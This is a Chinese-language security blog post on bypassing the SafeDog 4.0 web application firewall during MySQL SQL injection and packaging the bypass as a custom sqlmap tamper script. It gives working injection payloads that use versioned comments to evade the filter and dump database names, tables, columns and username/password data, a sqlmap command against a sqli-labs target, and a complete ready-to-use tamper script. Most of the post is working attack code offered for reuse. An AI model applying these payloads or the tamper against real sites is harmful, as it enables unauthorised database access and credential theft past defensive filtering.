---
title: "从过狗到编写tamper"
date: 2019-10-18T14:24:15+08:00
draft: false
tags: ['bypass']
categories: ['Bypass']
---


## 前言
在sql注入的时候，很可能会碰到各种厂商的waf，bypass之后，以后每次都要手工进行绕过，这样很麻烦。<!--more-->我们可以自己编写一个tamper，这样就达到一个自动化bypass的功能了

## 0x01 安全狗拦截的点
- and 1
只要and后面接数字，安全狗就会拦截
- order by
order 后面接by，安全狗就会拦截
- USER()
user后面接括号，安全狗就会拦截
- union select 
union后面接select,安全狗就会拦截



## 0x02 bypass安全狗
具体过程不说了，贴出payload<br>
1、查询用户
``` mysql
union/*!11440/**/select*/%201,hex(user/**/()),3
```

2、查询库名
``` mysql
union/*!11440/**/select*/%201,group_concat(schema_name),3 from `information_schema`.schemata --+
```

3、查询表名
```
union/*!11440/**/select*/ 1,group_concat(table_name),3 from `information_schema`.tables where table_schema='security' --+
```
4、查询列名
```
 union/*!11440/**/select*/ 1,group_concat(column_name),3 from `information_schema`.columns where table_name='users' --+
```
5、查询数据
```
 union/*!11440/**/select*/ 1,group_concat(username,password),3 from `users` --+
```

## 0x03 tamper结构
tamper由三大结构组成，如下:
```Python
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
Author:J8sec.com
"""

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
     pass

def tamper(payload, **kwargs):
      pass
```
### PROIORITY
PRIORITY是定义tamper的优先级，如果使用者使用了多个tamper，sqlmap就会根据每个tamper定义PRIORITY的参数等级来优先使用等级较高的tamper，PRIORITY有以下几个参数:<br>
   - LOWEST = -100
   - LOWER = -50
   - LOW = -10
   - NORMAL = 0
   - HIGH = 10
   - HIGHER = 50
   - HIGHEST = 100

值越高，优先级越高。因为我们这里只是绕过安全狗，随便设置个值就ok。

### dependencies  
dependencies主要是提示用户，这个tamper支持哪些数据库，具体代码如下:

``` Python
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
import os

__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage("Bypass 安全狗4.0 '%s' 只针对 %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

```
效果如下图:
![avatar](https://ae01.alicdn.com/kf/Ucc5c223016814f338e503e275092e982z.png)

DBMS.MYSQL这个参数代表的是Mysql，其他数据库的参数如下:

   - ACCESS = "Microsoft Access"
   - DB2 = "IBM DB2"
   - FIREBIRD = "Firebird"
   - MAXDB = "SAP MaxDB"
   - MSSQL = "Microsoft SQL Server"
   - MYSQL = "MySQL"
   - ORACLE = "Oracle"
   - PGSQL = "PostgreSQL"
   - SQLITE = "SQLite"
   - SYBASE = "Sybase"
   - HSQLDB = "HSQLDB"



### Tamper
tamper这个函数是tamper最重要的函数，你要实现的功能，全部写在这个函数里<br>payload这个参数就是sqlmap的原始注入payload，我们要实现绕过，一般就是针对这个payload的修改。kwargs是针对http头部的修改，如果你bypass，是通过修改http头，就需要用到这个



## 0x04 编写tamper

### 环境
攻击机:windows 10 安装有sqlmap,burpsuite<br>
靶机:windows 7 安装有sqli-labs注入环境，安全狗4.0 ip:

### 思路
我们利用Burpsuite来抓sqlmap的包，然后一步步进行绕过

### 编写过程
sqlmap敲如下命令
``` 
sqlmap.py -u http://192.168.1.120/sql/Less-1/?id=1 --proxy="http://127.0.0.1:8080" --random-agent
```
这里解释下为什么要加--random-agent这个参数，因为安全狗看到sqlmap默认的agent头会拦截，所以我们得加这个随即头参数来进行绕过

1、识别注入
抓到的sqlmap包如图:
![avatar](https://ae01.alicdn.com/kf/Ud23a8d50cd684b9a8936bc7d81660bc6X.png)
安全狗默认不会拦截，sqlmap就会判断可能存在注入
![avatar](https://ae01.alicdn.com/kf/U9576728bf2244f16986b088c8f793fa51.png)

继续抓包
![avatar](https://ae01.alicdn.com/kf/Ua7099160baf34e99885c448a8ac7acbe9.png)
被安全狗拦截了，前面说了，安全狗拦截and 加数字，现在我们开始编写tamper
```Python
def tamper(payload, **kwargs):
    payload=payload.replace('AND','/*!11440AND*/')
```
把and替换成我们前面bypass的payload，就不会拦截了。后面的order by，user(),union select同理，这里我就不一一介绍了，只讲下SESSION_USER()

2、识别数据库类型
绕过了and之后，sqlmap会识别数据库类型
![avatar](https://ae01.alicdn.com/kf/U9d35ec0263964e048e9ec8b9dc7bc5956.png)
虽然我们绕过了user()这个函数，安全狗还是进行了拦截,经过测试，发现安全狗拦截了SESSION_USER(),本来是想把SESSION_USER按照USER()进行绕过，也就是
hex(SESSION_user/**/()),发现会报错,如图:
![avatar](https://ae01.alicdn.com/kf/U98c466f05c36494c9c29aff8ffd9f65d6.png)
因为安全狗拦截函数是拦截名称和括号之间，既然名称那饶不了，我们就在括号里做文章。最后经过测试,payload为:hex(SESSION_USER(-- B%0a))


3、注入
因为后面payload大同小异，我们只要把sqlmap原始的UNION ALL SELECT替换成union/*!11440/**/select*/就好了


## 成品

```Python
#!/usr/bin/env python

"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
Author:J8sec.com
"""

from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
import os

__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage("Bypass 安全狗4.0 '%s' 只针对 %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    payload=payload.replace('AND','/*!11440AND*/')
    payload=payload.replace('ORDER','/*!11440order*/')
    payload=payload.replace('USER())','hex(user/**/()))')
    payload=payload.replace('SESSION_USER()','hex(SESSION_USER(-- B%0a))')
    payload=payload.replace('UNION ALL SELECT','union/*!11440/**/select*/')
    return payload
```
最后效果如图:
![avatar](https://ae01.alicdn.com/kf/Ue8a0066c15f54e61a40c798b5da70fe9w.png)



## 参考文章
https://www.jianshu.com/p/c24727dd1f7a
https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI